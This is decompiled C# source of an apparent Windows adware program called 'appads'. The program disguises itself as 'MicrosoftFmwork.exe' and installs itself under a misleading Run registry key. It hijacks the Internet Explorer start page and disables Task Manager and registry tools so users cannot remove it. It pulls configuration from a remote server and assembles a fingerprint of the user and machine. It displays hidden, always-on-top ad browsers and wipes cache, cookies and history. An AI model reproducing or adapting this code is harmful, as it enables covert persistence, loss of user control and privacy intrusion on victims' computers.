using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using appads.My;

namespace appads;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("WebBrowser1")]
	private WebBrowser _WebBrowser1;

	[AccessedThroughProperty("WebBrowser2")]
	private WebBrowser _WebBrowser2;

	[AccessedThroughProperty("WebBrowser3")]
	private WebBrowser _WebBrowser3;

	[AccessedThroughProperty("WebBrowser4")]
	private WebBrowser _WebBrowser4;

	[AccessedThroughProperty("WebBrowser5")]
	private WebBrowser _WebBrowser5;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	private bool permettrequitter;

	private bool entrainafficher;

	private bool affichermessage;

	private Thread t;

	private RegistryKey cle;

	private string message;

	private string infospc1;

	private string siite;

	private string codehtml;

	private string codehtmltemp;

	private string premp;

	private string deremp;

	private string tailledumot;

	private string lienads;

	private string liensup;

	private string lienaccueil;

	private string nomexe;

	private string timerss;

	internal virtual WebBrowser WebBrowser1
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			WebBrowserDocumentCompletedEventHandler val = new WebBrowserDocumentCompletedEventHandler(WebBrowser1_DocumentCompleted);
			if (_WebBrowser1 != null)
			{
				_WebBrowser1.remove_DocumentCompleted(val);
			}
			_WebBrowser1 = value;
			if (_WebBrowser1 != null)
			{
				_WebBrowser1.add_DocumentCompleted(val);
			}
		}
	}

	internal virtual WebBrowser WebBrowser2
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser2 = value;
		}
	}

	internal virtual WebBrowser WebBrowser3
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser3 = value;
		}
	}

	internal virtual WebBrowser WebBrowser4
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser4 = value;
		}
	}

	internal virtual WebBrowser WebBrowser5
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser5 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		lock (__ENCList)
		{
			__ENCList.Add(new WeakReference(this));
		}
		permettrequitter = false;
		entrainafficher = false;
		affichermessage = false;
		infospc1 = "http://app.ddl-gratuit.com/V1/user.php";
		lienaccueil = "http://www.ddl-gratuit.com";
		nomexe = "/MicrosoftFmwork.exe";
		timerss = "20000";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		components = new Container();
		WebBrowser1 = new WebBrowser();
		WebBrowser2 = new WebBrowser();
		WebBrowser3 = new WebBrowser();
		WebBrowser4 = new WebBrowser();
		WebBrowser5 = new WebBrowser();
		Timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		WebBrowser1.set_IsWebBrowserContextMenuEnabled(false);
		WebBrowser webBrowser = WebBrowser1;
		Point location = new Point(-25, -18);
		((Control)webBrowser).set_Location(location);
		WebBrowser webBrowser2 = WebBrowser1;
		Size minimumSize = new Size(20, 20);
		((Control)webBrowser2).set_MinimumSize(minimumSize);
		((Control)WebBrowser1).set_Name("WebBrowser1");
		WebBrowser1.set_ScriptErrorsSuppressed(true);
		WebBrowser1.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser3 = WebBrowser1;
		minimumSize = new Size(197, 600);
		((Control)webBrowser3).set_Size(minimumSize);
		((Control)WebBrowser1).set_TabIndex(0);
		WebBrowser2.set_IsWebBrowserContextMenuEnabled(false);
		WebBrowser webBrowser4 = WebBrowser2;
		location = new Point(299, 122);
		((Control)webBrowser4).set_Location(location);
		WebBrowser webBrowser5 = WebBrowser2;
		minimumSize = new Size(20, 20);
		((Control)webBrowser5).set_MinimumSize(minimumSize);
		((Control)WebBrowser2).set_Name("WebBrowser2");
		WebBrowser2.set_ScriptErrorsSuppressed(true);
		WebBrowser2.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser6 = WebBrowser2;
		minimumSize = new Size(58, 106);
		((Control)webBrowser6).set_Size(minimumSize);
		((Control)WebBrowser2).set_TabIndex(1);
		WebBrowser3.set_IsWebBrowserContextMenuEnabled(false);
		WebBrowser webBrowser7 = WebBrowser3;
		location = new Point(379, 20);
		((Control)webBrowser7).set_Location(location);
		WebBrowser webBrowser8 = WebBrowser3;
		minimumSize = new Size(20, 20);
		((Control)webBrowser8).set_MinimumSize(minimumSize);
		((Control)WebBrowser3).set_Name("WebBrowser3");
		WebBrowser3.set_ScriptErrorsSuppressed(true);
		WebBrowser3.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser9 = WebBrowser3;
		minimumSize = new Size(67, 96);
		((Control)webBrowser9).set_Size(minimumSize);
		((Control)WebBrowser3).set_TabIndex(2);
		WebBrowser4.set_IsWebBrowserContextMenuEnabled(false);
		WebBrowser webBrowser10 = WebBrowser4;
		location = new Point(299, 20);
		((Control)webBrowser10).set_Location(location);
		WebBrowser webBrowser11 = WebBrowser4;
		minimumSize = new Size(20, 20);
		((Control)webBrowser11).set_MinimumSize(minimumSize);
		((Control)WebBrowser4).set_Name("WebBrowser4");
		WebBrowser4.set_ScriptErrorsSuppressed(true);
		WebBrowser4.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser12 = WebBrowser4;
		minimumSize = new Size(58, 96);
		((Control)webBrowser12).set_Size(minimumSize);
		((Control)WebBrowser4).set_TabIndex(3);
		WebBrowser5.set_IsWebBrowserContextMenuEnabled(false);
		WebBrowser webBrowser13 = WebBrowser5;
		location = new Point(379, 132);
		((Control)webBrowser13).set_Location(location);
		WebBrowser webBrowser14 = WebBrowser5;
		minimumSize = new Size(20, 20);
		((Control)webBrowser14).set_MinimumSize(minimumSize);
		((Control)WebBrowser5).set_Name("WebBrowser5");
		WebBrowser5.set_ScriptErrorsSuppressed(true);
		WebBrowser5.set_ScrollBarsEnabled(false);
		WebBrowser webBrowser15 = WebBrowser5;
		minimumSize = new Size(67, 96);
		((Control)webBrowser15).set_Size(minimumSize);
		((Control)WebBrowser5).set_TabIndex(4);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		minimumSize = new Size(173, 572);
		((Form)this).set_ClientSize(minimumSize);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser5);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser4);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser3);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser2);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Form1");
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool InternetGetConnectedState(ref int lpdwFlags, int dwReserved);

	public bool IsConnected()
	{
		int lpdwFlags = default(int);
		return InternetGetConnectedState(ref lpdwFlags, 0);
	}

	public void DisableSound()
	{
		string text = "%SystemRoot%\\Media\\";
		if ((Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor > 0) ? true : false)
		{
			text += "Windows XP Start.wav";
		}
		else
		{
			if (Environment.OSVersion.Version.Major != 6)
			{
				return;
			}
			text += "Windows Navigation Start.wav";
		}
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("AppEvents\\Schemes\\Apps\\Explorer\\Navigating\\.Current", writable: true);
		registryKey.SetValue(null, "", RegistryValueKind.ExpandString);
	}

	public object infospc()
	{
		infospc1 = infospc1 + "?UserName=" + Environment.UserName.ToString();
		infospc1 = infospc1 + "&ComputerName=" + SystemInformation.get_ComputerName();
		infospc1 = infospc1 + "&WorkingArea=w." + SystemInformation.get_WorkingArea().Width + ".h." + SystemInformation.get_WorkingArea().Height;
		infospc1 = infospc1 + "&ProcessorCount=" + Conversions.ToString(Environment.ProcessorCount);
		_ = Environment.ProcessorCount;
		Environment.OSVersion.ToString();
		infospc1 = infospc1 + "&OSVersion=" + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName();
		string text = Environment.GetCommandLineArgs()[0];
		infospc1 = infospc1 + "&exepath=" + text;
		infospc1 = infospc1 + "&SystemDirectory=" + Environment.SystemDirectory;
		infospc1 = infospc1 + "&langue=" + ((ServerComputer)MyProject.Computer).get_Info().get_InstalledUICulture().ToString();
		infospc1 = infospc1 + "&ram=" + Conversions.ToString(Math.Round((double)((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory() / 1000000000.0, 3));
		return infospc1;
	}

	public void bloquer()
	{
		try
		{
			cle = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			cle.SetValue("First Windows Start", Environment.SystemDirectory + nomexe, RegistryValueKind.String);
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main", "Start Page", (object)lienaccueil, RegistryValueKind.String);
			string path = Environment.SystemDirectory + nomexe;
			File.WriteAllBytes(path, File.ReadAllBytes(Application.get_ExecutablePath()));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			cle = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			cle = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			cle.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
			cle.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
			cle.Close();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void Verifwebsite()
	{
		siite = "http://app.ddl-gratuit.com/V1/config.php";
		WebRequest webRequest = WebRequest.Create(siite);
		WebResponse response = webRequest.GetResponse();
		StreamReader streamReader = null;
		try
		{
			streamReader = new StreamReader(response.GetResponseStream());
			codehtml = streamReader.ReadToEnd();
		}
		finally
		{
			response?.Close();
		}
		codehtmltemp = codehtml;
		checked
		{
			if (codehtmltemp.Contains("siteref : "))
			{
				premp = Conversions.ToString(Strings.InStr(codehtmltemp, "siteref : ", (CompareMethod)0) + "siteref : ".Length);
				codehtmltemp = Strings.Mid(codehtmltemp, Conversions.ToInteger(premp));
				deremp = Conversions.ToString(Strings.InStr(codehtmltemp, ";", (CompareMethod)0));
				tailledumot = Conversions.ToString(Conversions.ToDouble(deremp) - 1.0);
				liensup = Strings.Mid(codehtmltemp, 1, Conversions.ToInteger(tailledumot));
			}
			else
			{
				liensup = "http://app.ddl-gratuit.com/V1/W/forex.htm";
			}
			codehtmltemp = codehtml;
			if (codehtmltemp.Contains("siteacc : "))
			{
				premp = Conversions.ToString(Strings.InStr(codehtmltemp, "siteacc : ", (CompareMethod)0) + "siteacc : ".Length);
				codehtmltemp = Strings.Mid(codehtmltemp, Conversions.ToInteger(premp));
				deremp = Conversions.ToString(Strings.InStr(codehtmltemp, ";", (CompareMethod)0));
				tailledumot = Conversions.ToString(Conversions.ToDouble(deremp) - 1.0);
				lienaccueil = Strings.Mid(codehtmltemp, 1, Conversions.ToInteger(tailledumot));
			}
			else
			{
				lienaccueil = "http://www.dd-gratuit.com";
			}
			codehtmltemp = codehtml;
			if (codehtmltemp.Contains("siteads : "))
			{
				premp = Conversions.ToString(Strings.InStr(codehtmltemp, "siteads : ", (CompareMethod)0) + "siteads : ".Length);
				codehtmltemp = Strings.Mid(codehtmltemp, Conversions.ToInteger(premp));
				deremp = Conversions.ToString(Strings.InStr(codehtmltemp, ";", (CompareMethod)0));
				tailledumot = Conversions.ToString(Conversions.ToDouble(deremp) - 1.0);
				lienads = Strings.Mid(codehtmltemp, 1, Conversions.ToInteger(tailledumot));
			}
			else
			{
				lienads = "http://app.ddl-gratuit.com/V1/W/forex.htm";
			}
			codehtmltemp = codehtml;
			if (codehtmltemp.Contains("exename : "))
			{
				premp = Conversions.ToString(Strings.InStr(codehtmltemp, "exename : ", (CompareMethod)0) + "exename : ".Length);
				codehtmltemp = Strings.Mid(codehtmltemp, Conversions.ToInteger(premp));
				deremp = Conversions.ToString(Strings.InStr(codehtmltemp, ";", (CompareMethod)0));
				tailledumot = Conversions.ToString(Conversions.ToDouble(deremp) - 1.0);
				nomexe = Strings.Mid(codehtmltemp, 1, Conversions.ToInteger(tailledumot));
			}
			else
			{
				nomexe = "/MicrosoftFmwork.exe";
			}
			codehtmltemp = codehtml;
			if (codehtmltemp.Contains("infospc : "))
			{
				premp = Conversions.ToString(Strings.InStr(codehtmltemp, "infospc : ", (CompareMethod)0) + "infospc : ".Length);
				codehtmltemp = Strings.Mid(codehtmltemp, Conversions.ToInteger(premp));
				deremp = Conversions.ToString(Strings.InStr(codehtmltemp, ";", (CompareMethod)0));
				tailledumot = Conversions.ToString(Conversions.ToDouble(deremp) - 1.0);
				infospc1 = Strings.Mid(codehtmltemp, 1, Conversions.ToInteger(tailledumot));
			}
			else
			{
				infospc1 = "http://app.ddl-gratuit.com/V1/";
			}
			codehtmltemp = codehtml;
			if (codehtmltemp.Contains("timerss : "))
			{
				premp = Conversions.ToString(Strings.InStr(codehtmltemp, "timerss : ", (CompareMethod)0) + "timerss : ".Length);
				codehtmltemp = Strings.Mid(codehtmltemp, Conversions.ToInteger(premp));
				deremp = Conversions.ToString(Strings.InStr(codehtmltemp, ";", (CompareMethod)0));
				tailledumot = Conversions.ToString(Conversions.ToDouble(deremp) - 1.0);
				timerss = Strings.Mid(codehtmltemp, 1, Conversions.ToInteger(tailledumot));
			}
			else
			{
				timerss = "100000";
			}
			codehtmltemp = codehtml;
			if (codehtmltemp.Contains("message : "))
			{
				premp = Conversions.ToString(Strings.InStr(codehtmltemp, "message : ", (CompareMethod)0) + "message : ".Length);
				codehtmltemp = Strings.Mid(codehtmltemp, Conversions.ToInteger(premp));
				deremp = Conversions.ToString(Strings.InStr(codehtmltemp, ";", (CompareMethod)0));
				tailledumot = Conversions.ToString(Conversions.ToDouble(deremp) - 1.0);
				message = Strings.Mid(codehtmltemp, 1, Conversions.ToInteger(tailledumot));
			}
			else
			{
				message = "walo";
			}
		}
	}

	public void af()
	{
		entrainafficher = true;
		WebBrowser2.Refresh();
		WebBrowser3.Refresh();
		WebBrowser4.Refresh();
		WebBrowser5.Refresh();
		entrainafficher = false;
	}

	public void vidercache()
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(32));
			FileInfo[] files = directoryInfo.GetFiles();
			FileInfo[] array = files;
			foreach (FileInfo fileInfo in array)
			{
				fileInfo.Delete();
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			DirectoryInfo[] array2 = directories;
			foreach (DirectoryInfo directoryInfo2 in array2)
			{
				directoryInfo2.Delete();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void vidercookies()
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(33));
			FileInfo[] files = directoryInfo.GetFiles();
			FileInfo[] array = files;
			foreach (FileInfo fileInfo in array)
			{
				fileInfo.Delete();
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			DirectoryInfo[] array2 = directories;
			foreach (DirectoryInfo directoryInfo2 in array2)
			{
				directoryInfo2.Delete();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void viderhistory()
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Conversions.ToString(34));
			FileInfo[] files = directoryInfo.GetFiles();
			FileInfo[] array = files;
			foreach (FileInfo fileInfo in array)
			{
				fileInfo.Delete();
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			DirectoryInfo[] array2 = directories;
			foreach (DirectoryInfo directoryInfo2 in array2)
			{
				directoryInfo2.Delete();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void WebBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		if (!affichermessage && !message.Contains("walo"))
		{
			affichermessage = true;
			MessageBox.Show(message);
		}
		if (string.Compare(WebBrowser1.get_Url().ToString(), lienads) != 0)
		{
			vidercache();
			vidercookies();
			viderhistory();
			((Form)this).Close();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			if (!IsConnected())
			{
				Thread.Sleep(508000);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Verifwebsite();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			bloquer();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			((Form)this).set_TopMost(true);
			DisableSound();
			infospc();
			WebBrowser1.Navigate(lienads);
			WebBrowser2.Navigate(liensup);
			WebBrowser3.Navigate(liensup);
			WebBrowser4.Navigate(lienads);
			WebBrowser5.Navigate(liensup);
			Timer1.set_Enabled(true);
			Timer1.set_Interval(Conversions.ToInteger(timerss));
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			entrainafficher = true;
			WebBrowser2.Refresh();
			WebBrowser3.Refresh();
			WebBrowser4.Refresh();
			WebBrowser5.Refresh();
			entrainafficher = false;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
